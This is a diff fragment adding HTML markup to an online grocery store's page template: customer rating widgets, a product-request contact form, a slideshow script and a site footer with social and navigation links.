+					    <input type="radio" name="rating3" id="rating32" value="1" onclick="getRate('rating32', 'rate_order_pack');"/><span></span>
+					    <input type="radio" name="rating3" id="rating33" value="2" onclick="getRate('rating33', 'rate_order_pack');"/><span></span>
+					    <input type="radio" name="rating3" id="rating34" value="3" onclick="getRate('rating34', 'rate_order_pack');"/><span></span>
+					    <input type="radio" name="rating3" id="rating35" value="4" onclick="getRate('rating35', 'rate_order_pack');"/><span></span>
+					    <input type="radio" name="rating3" id="rating36" value="5" onclick="getRate('rating36', 'rate_order_pack');"/><span></span>
+					    <input type="hidden" name="rate_order_pack" id="rate_order_pack" value="0" />
+					</div>
+					<div class="rating4">
+					    <input type="radio" name="rating4" id="rating41" value="0" checked /><span id="hide"></span>
+					    <input type="radio" name="rating4" id="rating42" value="1" onclick="getRate('rating42', 'rate_fresh_fruits');"/><span></span>
+					    <input type="radio" name="rating4" id="rating43" value="2" onclick="getRate('rating43', 'rate_fresh_fruits');"/><span></span>
+					    <input type="radio" name="rating4" id="rating44" value="3" onclick="getRate('rating44', 'rate_fresh_fruits');"/><span></span>
+					    <input type="radio" name="rating4" id="rating45" value="4" onclick="getRate('rating45', 'rate_fresh_fruits');"/><span></span>
+					    <input type="radio" name="rating4" id="rating46" value="5" onclick="getRate('rating46', 'rate_fresh_fruits');"/><span></span>
+					    <input type="hidden" name="rate_fresh_fruits" id="rate_fresh_fruits" value="0" />
+					</div>
+					<div class="rating5">
+					    <input type="radio" name="rating5" id="rating51" value="0" checked /><span id="hide"></span>
+					    <input type="radio" name="rating5" id="rating52" value="1" onclick="getRate('rating52', 'rate_cost_porducts');"/><span></span>
+					    <input type="radio" name="rating5" id="rating53" value="2" onclick="getRate('rating53', 'rate_cost_porducts');"/><span></span>
+					    <input type="radio" name="rating5" id="rating54" value="3" onclick="getRate('rating54', 'rate_cost_porducts');"/><span></span>
+					    <input type="radio" name="rating5" id="rating55" value="4" onclick="getRate('rating55', 'rate_cost_porducts');"/><span></span>
+					    <input type="radio" name="rating5" id="rating56" value="5" onclick="getRate('rating56', 'rate_cost_porducts');"/><span></span>
+					    <input type="hidden" name="rate_cost_porducts" id="rate_cost_porducts" value="0" />
+					</div>
+					<div class="rating6">
+					    <input type="radio" name="rating6" id="rating61" value="0" checked /><span id="hide"></span>
+					    <input type="radio" name="rating6" id="rating62" value="1" onclick="getRate('rating62', 'rate_customer_care');"/><span></span>
+					    <input type="radio" name="rating6" id="rating63" value="2" onclick="getRate('rating63', 'rate_customer_care');"/><span></span>
+					    <input type="radio" name="rating6" id="rating64" value="3" onclick="getRate('rating64', 'rate_customer_care');"/><span></span>
+					    <input type="radio" name="rating6" id="rating65" value="4" onclick="getRate('rating65', 'rate_customer_care');"/><span></span>
+					    <input type="radio" name="rating6" id="rating66" value="5" onclick="getRate('rating66', 'rate_customer_care');"/><span></span>
+					    <input type="hidden" name="rate_customer_care" id="rate_customer_care" value="0" />
+					</div>
+				
+				</div>
+				<div style="clear:both"><span></span></div>
+				
+				<div class="text-area">
+					<p class="hm_content">Comment <span style="color:#ff0000;">*</span></p>
+					<textarea name="comment" id="comment" class="input-text" rows="3" cols="64"></textarea>      
+				</div>
+					
+				<div class="submit">                
+                <input id="submit" type="image" src="http://www.citybigmart.com/skin/frontend/default/default/quickcontact/images/submit.jpg"> <a href="#" class="close"><img src="http://www.citybigmart.com/skin/frontend/default/default/quickcontact/images/close.jpg" /></a> </div>  
+				
+		</form>
+        </div>
+		</div>
+	
+	</div>
+	
+	<div id="dialog2" class="window" style="z-index: 99999999;">
+						
+	<div class="form-quick-contact">
+        <div style="padding-right:30px;">
+		<div class="title" style="padding-bottom:15px;"><h1 id="quick_contact_title2">Get the products that aren't available in market by requesting here</h1></div>
+		<form action="http://www.citybigmart.com/index.php/quickcontact/index/post/" method="post" name="contactform2" id="contactform2">
+				
+				<div class="text"> 
+					<div class="info-txt"> Your Name <span style="color:#ff0000;">*</span></div>
+					<div class="info-txt"> Your Email <span style="color:#ff0000;">*</span></div>
+					<div class="info-txt"> Contact No. <span style="color:#ff0000;">*</span></div>					
+				</div>
+								
+				<div class="input">
+					<input class="input-text textbox" value="" type="text" name="name" id="name2"/>
+					<input class="input-text textbox" value="" type="text" name="email" id="email2"/>
+					<input class="input-text textbox" type="text" name="telephone" id="telephone2" value=""/>
+				
+				</div>
+				<div style="clear:both"><span></span></div>
+				
+				<div class="text-area">
+					<p class="hm_content">Request <span style="color:#ff0000;">*</span></p>
+					<textarea name="comment" id="comment2" class="input-text" rows="3" cols="64"></textarea>      
+				</div>
+					
+				<div class="submit">                
+                <input id="submit2" type="image" src="http://www.citybigmart.com/skin/frontend/default/default/quickcontact/images/submit.jpg"> <a href="#" class="close"><img src="http://www.citybigmart.com/skin/frontend/default/default/quickcontact/images/close.jpg" /></a> </div>  
+				
+		</form>
+        </div>
+		</div>
+	
+	</div>
+	<div id="mask"></div>
+	
+	
+</div>
+<script>
+function getRate(id, seid)
+{
+	//alert(document.getElementById(id).value);
+	var current_rate = document.getElementById(id).value;
+	document.getElementById(seid).value = current_rate;
+}
+
+</script>
+
+
+
+<script language="javascript">
+//<![CDATA[
+jQuery(document).ready(function (){
+    jQuery("#pikame").PikaChoose({
+        autoPlay: Boolean("1"),
+        hoverPause: Boolean("1"),
+        stopOnClick: Boolean("true"),
+        speed: parseInt("5000"),
+        animationSpeed: parseInt("800"),
+        transition:[parseInt("-1")]
+    });
+});
+//]]>
+</script>
+<!-- start footer -->
+<div style="    background: none repeat scroll 0 0 rgba(0, 0, 0, 0);
+    width: 100%;
+    z-index: 99999999;">
+<div class="footer">
+				<div class="inner inner_top">
+			<div class="one_fourth column">
+				<h4>Join us on Facebook</h4>
+				<iframe src="//www.facebook.com/plugins/likebox.php?href=https://www.facebook.com/citybigmart&width=292&height=381px&colorscheme=light&show_faces=true&border_color&stream=false&header=false&" style="border:none; overflow:scroll; width:206px; height:262px;" ></iframe>
+			</div>
+
+			<div class="one_fourth column">
+			  <h4>Twitter feed</h4>
+			  <a href="https://twitter.com/CityBigMartcom" class="twitter_follow_link">Follow us on <span>Twitter</span>!</a>
+			</div>
+			<div class="one_fourth column">
+			<h4>Have a Question?</h4>
+				<ul class="footer_links">
+					<li><a href="http://www.citybigmart.com/index.php/howtoplaceorder"> How to place an Order</a></li>
+					 <li><a class="docklink" href="#dialog2" name="modal2">Request For Product</a></li>
+					  <li><a href="http://www.citybigmart.com/index.php/trackorder"> Track My Order </a></li>
+					  <!--<li><a href="http://www.citybigmart.com/index.php/cancellation"> Cancellation & Returns </a></li>-->
+					 <li><a href="http://www.citybigmart.com/index.php/gifturf"> Gift to Ur Friends </a></li>
+					  <li><a href="http://www.citybigmart.com/index.php/refrall">Referral Program</a></li>
+				</ul>
+			  </div>
+				<div class="one_fourth last column">
+				  <h4>Extras</h4>
+				  <ul class="footer_links">
+					<li><a href="http://www.citybigmart.com/index.php/contacts">Contact Us</a></li>
+					<li><a href="http://www.citybigmart.com/index.php/about">About Us</a></li>
+					<!--<li><a href="http://www.citybigmart.com/index.php/brands">Brands</a></li>-->
+					<li><a href="http://www.citybigmart.com/index.php/notifyme">Notify Me</a></li>
+					<li><a href="http://www.citybigmart.com/index.php/privatepolicy">Privacy Policy</a></li>
+					<li><a href="http://www.citybigmart.com/index.php/termconditiond">Terms & Conditions</a></li>
+				  </ul>
+				</div>
+			<div class="clear"></div>
+		</div>
+</div>
+<div id="powered">
+
+<div class="inner">
+	<div style="float:left">Copyright &copy; 2013-14   City Big Mart Retail. All Rights Reserved</div>
+        Powered by <a href="#">Logic Inception</a> &copy; 2013-14</div>
+</div>
+        <!-- end footer -->
+</div>
+</div>
+</body>
+</html>
